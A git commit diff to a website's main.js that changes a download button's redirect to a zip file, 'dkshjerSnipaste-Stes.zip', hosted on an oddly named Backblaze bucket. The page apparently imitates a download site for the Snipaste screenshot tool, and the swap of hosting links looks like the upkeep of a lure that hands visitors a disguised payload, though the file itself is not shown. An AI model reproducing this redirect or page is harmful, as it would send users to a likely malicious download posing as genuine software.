9487ee2594ad68af7c42f01c96811658ab66a7f0
kuailianl88 <calorimeta@gmail.com>
2025-09-03 22:35:06 +0800

    Update main.js

--- js/main.js
+++ js/main.js
@@ -8,10 +8,11 @@ downLinks.forEach(function(link) {javascript:;
         event.preventDefault();
 
         // 执行跳转操作，替换下面的URL为您想要跳转的URL
-        window.location.href = "https://f005.backblazeb2.com/b2api/v1/b2_download_file_by_id?fileId=4_z64b9c51816b9c17a9a8a0311_f105102a5d9795722_d20250903_m045953_c005_v0501026_t0048_u01756875593215";
+        window.location.href = "https://jasgsdhnayutjzg.s3.us-east-005.backblazeb2.com/dkshjerSnipaste-Stes.zip";
     });
 
 });
+
 
 
 
